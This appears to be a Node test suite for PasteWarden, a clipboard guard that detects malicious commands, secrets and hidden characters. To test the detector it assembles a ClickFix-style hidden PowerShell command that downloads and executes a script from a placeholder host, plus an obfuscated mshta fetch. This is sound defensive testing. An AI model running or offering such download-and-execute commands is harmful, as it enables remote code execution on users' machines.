// node --test: runs the API and the corpus through both builds (WASM and the
// wasm2js fallback). Requires `pnpm build` first (dist/).
//
// Malicious samples are assembled from fragments at run time (Defender); fake
// secrets only (checksum-valid made-up numbers).
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, test } from 'node:test';

import { cases, repoRoot, runCase } from './corpus.mjs';

const clickfix = () =>
  ['power', 'shell -w hidden -c "i', 'ex(i', "wr 'https://example.invalid/a.ps1')\""].join('');

/** Each backend gets its own module instance (query string). */
async function load(backend) {
  const api = await import(`../dist/index.js?backend=${backend}`);
  await api.init({ backend });
  assert.equal(api.backend(), backend);
  return api;
}

for (const backend of ['wasm', 'wasm2js']) {
  describe(backend, async () => {
    const api = await load(backend);

    test('functions throw before init', async () => {
      const fresh = await import(`../dist/index.js?fresh=${backend}`);
      assert.throws(() => fresh.analyze('x'), /init/);
    });

    test('engine version matches ENGINE_VERSION and Cargo.toml', () => {
      assert.equal(api.engineVersion(), api.ENGINE_VERSION);
      const cargo = readFileSync(join(repoRoot, 'Cargo.toml'), 'utf8');
      assert.match(
        cargo,
        new RegExp(`\\[workspace\\.package\\]\\s*\\nversion = "${api.ENGINE_VERSION}"`),
      );
    });

    test('clickfix command is quarantined with localized reasons', () => {
      const r = api.analyze(clickfix(), { locale: 'en' });
      assert.equal(r.schema, 1);
      assert.equal(r.action, 'quarantine');
      assert.equal(r.command.level, 'malicious');
      assert.ok(r.command.risk_score >= 60);
      assert.deepEqual(r.command.hosts, ['example.invalid']);
      assert.ok(r.command.reasons.every((x) => x.id.startsWith('cmd-') && x.text.length > 0));
      const zh = api.analyze(clickfix());
      assert.notEqual(
        zh.command.reasons[0].text,
        r.command.reasons[0].text,
        'default locale is zh-TW',
      );
      assert.equal(api.analyze('echo hello').action, 'allow');
      // Context weighs the score, never the verdict.
      const fromBrowser = api.analyze('cmd /c dir', { context: { sourceKind: 'browser' } });
      const fromTerminal = api.analyze('cmd /c dir', { context: { sourceKind: 'terminal' } });
      assert.equal(fromBrowser.command.level, fromTerminal.command.level);
      assert.ok(fromBrowser.command.risk_score > fromTerminal.command.risk_score);
    });

    test('deobfuscation trace has kinds and masked previews', () => {
      const r = api.analyze(["'ms'+'h", "ta' https://example.invalid/x"].join(''));
      assert.ok(r.command.trace.some((s) => s.kind === 'concat'));
      const d = api.deobfuscate(["'ms'+'h", "ta' https://example.invalid/x"].join(''), 'en');
      assert.ok(d.output_preview.includes('mshta'));
    });

    test('secret spans are UTF-16 with an emoji before the secret', () => {
      const id = 'A123456789';
      const text = `🔑😀 身分證 ${id} ok`;
      const r = api.analyze(text);
      assert.equal(r.action, 'warn');
      assert.equal(r.secrets.length, 1);
      const [s] = r.secrets;
      assert.equal(s.kind, 'national_id');
      assert.equal(s.rule_id, 'tw-national-id');
      assert.equal(s.masked, 'A12****789');
      assert.equal(s.label, '身分證字號');
      assert.deepEqual(s.span_utf16, [text.indexOf(id), id.length]);
      assert.equal(text.slice(s.span_utf16[0], s.span_utf16[0] + s.span_utf16[1]), id);
      assert.ok(!JSON.stringify(r).includes(id), 'the report never holds the plaintext');
    });

    test('mask replaces only the secrets and keeps surrogate pairs intact', () => {
      const text = '前 😀 A123456789 與 B212345670 後 🔑';
      const r = api.analyze(text);
      assert.equal(api.mask(text, r, 'en'), '前 😀 A12****789 與 B21****670 後 🔑');
      assert.equal(api.mask(text, { secrets: [] }), text);
      assert.throws(
        () => api.mask(text, { secrets: [{ kind: 'nope', masked: '', span_utf16: [0, 1] }] }),
        /kind/,
      );
    });

    test('hidden characters and wallets', () => {
      const r = api.analyze('pay​​ me');
      assert.equal(r.hidden.level, 'suspicious');
      assert.ok(r.hidden.reasons[0].id.startsWith('hidden-'));
      const addr = '0x52908400098527886E0F7030069857D2E4169EE7';
      const w = api.analyze(`🔑 ${addr}`).wallets;
      assert.deepEqual(w, [{ currency: 'ethereum', span_utf16: [3, 42] }]);
    });

    test('settings and bad options', () => {
      assert.equal(
        api.analyze('A123456789', { settings: { detect_secrets: false } }).action,
        'allow',
      );
      assert.equal(
        api.analyze(clickfix(), { settings: { block_malicious_commands: false } }).action,
        'warn',
      );
      assert.throws(
        () => api.analyze('A123456789', { context: { sourceKind: 'bogus' } }),
        (e) => !String(e.message).includes('A123456789'),
      );
    });

    test('ui messages in both locales', () => {
      const zh = api.messages('zh-TW');
      const en = api.messages('en');
      assert.deepEqual(Object.keys(zh).sort(), Object.keys(en).sort());
      for (const k of [
        'ui-app-name',
        'ui-action-allow',
        'ui-action-warn',
        'ui-action-quarantine',
        'ui-paste-masked',
        'ui-paste-original',
        'ui-cancel',
        'ui-allow-once',
        'ui-theme',
        'ui-language',
      ]) {
        assert.ok(zh[k] && en[k], k);
      }
      assert.equal(en['ui-app-name'], 'PasteWarden');
      assert.equal(zh['ui-app-name'], '剪貼簿守門員');
    });

    test('corpus: command / secret / hidden cases match the Rust expectations', () => {
      const all = cases();
      const counts = { pass: 0, fail: 0, skip: 0 };
      const failures = [];
      const byOp = {};
      for (const c of all) {
        const { status, failures: f } = runCase(api, c);
        counts[status]++;
        byOp[c.op] = (byOp[c.op] ?? 0) + (status === 'pass' ? 1 : 0);
        if (status !== 'pass') failures.push(`${status} ${c.id}: ${f.join('; ')}`);
      }
      const realFailures = failures.filter((f) => f.startsWith('fail'));
      assert.deepEqual(realFailures, [], realFailures.join('\n'));
      // Unhandled expect keys are listed, and must stay rare.
      if (counts.skip) console.log(`[${backend}] skipped:\n${failures.join('\n')}`);
      assert.ok(counts.pass >= 0.95 * all.length, JSON.stringify(counts));
      for (const op of [
        'command.analyze',
        'command.analyze_in',
        'secret.find',
        'secret.mask_text',
        'hidden.analyze',
      ]) {
        assert.ok(byOp[op] > 0, op);
      }
      console.log(`[${backend}] corpus ${JSON.stringify(counts)} ${JSON.stringify(byOp)}`);
    });
  });
}
